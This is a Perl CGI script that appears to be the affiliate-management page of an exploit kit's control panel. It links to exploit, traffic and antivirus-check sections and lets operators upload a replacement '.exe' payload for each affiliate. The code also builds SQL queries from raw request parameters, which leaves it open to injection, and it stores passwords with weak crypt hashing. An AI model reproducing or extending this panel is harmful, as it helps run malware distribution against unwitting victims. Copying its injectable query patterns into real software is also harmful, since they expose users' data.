#!/usr/bin/perl
  
  # index.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use File::Basename;
  use DBI;
  require "xpl/config.pl";
  
  $db_name = 'DBI:mysql:' . $config{MysqlDB};
  $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

  $session = CGI::Session->load();
  $q = new CGI;
  
  $cook = $q->param('cook');
  $selectuser = $q->param('selectuser');
  $password2 = $q->param('password2');
  $username2 = $q->param('username2');
  $affid2 = $q->param('affid2');
  $email2 = $q->param('email2');
  $deluser = $q->param('deluser');
  $vfy = $q->param('vfy');
  $filename = $q->param("exetoload");
 
  #limit file upload to 5mb
  $CGI::POST_MAX = 1024 * 5000;
  
  #limit filename
  my $safe_filename_characters = "a-zA-Z0-9_.-";
  
  #upload directory
  my $upload_dir = 'xpl/dep/';

  $req = "SELECT id,username,password,affid,email,cook,filez FROM affiliates WHERE username='$selectuser'";
  $sth = $dbh->prepare($req);
  $sth->execute() || die;
  while(my @row = $sth->fetchrow_array)
  {
    $id = $row['0'];
    $name = $row['1'];
    $password = $row['2'];
    $affid = $row['3'];
    $email = $row['4'];
    $cook = $row['5'];
    $filez = $row['6'];
  }
  $sth -> finish;
  
  if($vfy ne 'xplad')
  {
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }  
  if($session->is_expired)
  {
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Your has session expired. Please login again.";
	print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
    #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
    #Select the Users from the DB
    $req = "SELECT username FROM affiliates";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $people = $row['0'];
      if($selectuser eq $people)
      {
	$choiceoption .= '<option selected="yes" value="xplprograms.pl?cook=' . $cook . '&selectuser=' . $people . '&vfy=xplad">' . $people . '</option>' . "\n";
      }
      else
      {
	$choiceoption .= '<option value="xplprograms.pl?cook=' . $cook . '&selectuser=' . $people . '&vfy=xplad">' . $people . '</option>' . "\n";
      }
    }
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");

    if($password2 ne "")
    {
      #Insert the password parameter 
      $cryptpwd = substr(crypt($password2,substr($password2,0,2)),2);

      $sql = "UPDATE affiliates SET password='$cryptpwd' WHERE id=$id";
      $statement = $dbh->prepare($sql);
      $statement->execute() or die "$DBI::errstr";

      $stringtoprint2 = "<font color='red'>Password Updated</font><br>\n";
      $password = $password2;
    }

    if($email2 ne "")
    {
      #Insert the username parameter
      $sql = "UPDATE affiliates SET email='$email2' WHERE id=$id";
      $statement = $dbh->prepare($sql);
      $statement->execute() or die "$DBI::errstr";

      $stringtoprint2 = "<font color='red'>Email Updated</font><br>\n";
      $email = $email2;
    }

    if($deluser eq "yes")
    {
      #Delete username db row (affiliates)
      $sql = "delete from affiliates where username='$selectuser'";
      $statement = $dbh->prepare($sql);
      $statement->execute() or die "$DBI::errstr";

      #Delete username db row (options)
      $sql = "delete from options where username='$selectuser'";
      $statement = $dbh->prepare($sql);
      $statement->execute() or die "$DBI::errstr";
	  
      #delete the file
      unlink("xpl/dep/$filez");
	  
      $stringtoprint2 = "<font color='red'>User Deleted</font><br>\n";
    }

    if($filename ne "")
    {
      my ( $name, $path, $extension ) = fileparse ( $filename, '\..*' );  
      $filename = $name . $extension;  
      $filename =~ tr/ /_/;  
      $filename =~ s/[^$safe_filename_characters]//g;  
 
      if ( $filename =~ /^([$safe_filename_characters]+)$/ )  
      {  
        $sortthtyy = $1;
        if($filename =~ m/.exe$/g)
        {
          $filename = $sortthtyy;  
	  $safefile2 = '1';
        }
        else
        {
          $stringtoprint2 = '<font color="red">File ext not supported !</font><br>' . "\n";
        }
      }  
      else  
      {  
        $stringtoprint2 = '<font color="red">Filename contains invalid characters !</font><br>' . "\n";
      }
    }

    if($safefile2 eq '1')
    {
      #delete oldfile
      unlink("xpl/dep/$filez");
      #upload file
      my $upload_filehandle = $q->upload("exetoload");  
      open ( UPLOADFILE, ">$upload_dir/$filez" ) or die "$!"; 
      binmode UPLOADFILE;  
      while ( <$upload_filehandle> )
      {  
        print UPLOADFILE;  
      }  
      close UPLOADFILE;
      $stringtoprint2 = '<font color="red">File have been successfully updated !</font><br>' . "\n";
    }

    if($selectuser ne "Admin")
    {
      $eraseuseroption = '<form method="post">' . "\n";
      $eraseuseroption .= "<input type=\"hidden\" name=\"cook\" value=\"$cook\">\n";
      $eraseuseroption .= "<input type=\"hidden\" name=\"selectuser\" value=\"$selectuser\">\n";
      $eraseuseroption .= "<input type=\"hidden\" name=\"deluser\" value=\"yes\">\n";
      $eraseuseroption .= "<input type=\"hidden\" name=\"vfy\" value=\"xplad\">\n";
      $eraseuseroption .= "<input type=\"submit\" value=\"Delete User\"><br><br>\n";
      $eraseuseroption .= "</form>\n";

      $changeexeoption .= '<form method="post" enctype="multipart/form-data">' . "\n";
      $changeexeoption .= '<font color=black>New exe: </font><input type="file" name="exetoload" /> <br>' . "\n";
      $changeexeoption .= '<input type="hidden" name="cook" value="' . $cook . '">' . "\n";
      $changeexeoption .= '<input type="hidden" name="selectuser" value="' . $selectuser . '">' . "\n";
      $changeexeoption .= '<input type="hidden" name="vfy" value="xplad">' . "\n";
      $changeexeoption .= '<input type="submit" value="Update Exe"><br><br><br>' . "\n";
      $changeexeoption .= '</form>' . "\n";
    }
    indexalltab();
  }
  
  
sub indexalltab
{
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - User Information</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">
    
</HEAD><BODY>

<DIV id="top_nav">
	<DIV class="content">
    
        <UL>
            <LI><A href="xplindex.pl?cook=$cook&vfy=xplad" title="Home" class="Home">Home</A></LI>
            <LI><A href="xplstats.pl?cook=$cook&vfy=xplad" title="Reports">Reports</A></LI>
            <LI><A href="xplprograms.pl?cook=$cook&selectuser=Admin&vfy=xplad" title="Accounts">Accounts</A></LI>
	    <LI><A href="xploptions.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Exploits Options">Exploits</A></LI>
	    <LI><A href="xpltraffic.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Traffic Options">Traffic</A></LI>
            <LI><A href="xplavs.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="AVs Check">AV Check</A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
        
    </DIV>
</DIV>
<center>

<br><br><br>
<b>
<h2>[ Account Summary ]</h2>
<br>

<DIV id="main">
<DIV class="content">
<DIV id="pages">
<DIV id="home">
<DIV>
</DIV>
<br><br>
<h3>Contact Information</h3><br>
$stringtoprint2
<form method="post">
Select Username: <SELECT name="selectuser" ONCHANGE="location = this.options[this.selectedIndex].value;">
$choiceoption
</SELECT>
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="vfy" value="xplad">
</form><br>
$eraseuseroption
<form method="post">
<font color=black>Username:</font> $name <br>
<font color=black>AffID:</font> $affid <br>
<font color=black>Email:</font> <input type="text" name="email2" value="$email"> <br>
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="selectuser" value="$selectuser">
<input type="hidden" name="vfy" value="xplad">
<input type="submit" value="Change Infos"><br><br><br>
</form>
<form method="post">
<font color=black>Password:</font> <input type="password" name="password2" value="$password"> <br>
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="selectuser" value="$selectuser">
<input type="hidden" name="vfy" value="xplad">
<input type="submit" value="Change Password"><br><br><br>
</form>

$changeexeoption

<br><br>
</DIV>
</DIV>
</DIV>
</DIV>


<br>
if you have questions or program request, contact us at <a href="mailto:$config{NetEmail}"> $config{NetEmail}</a>
<br><br>
</center>

<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}
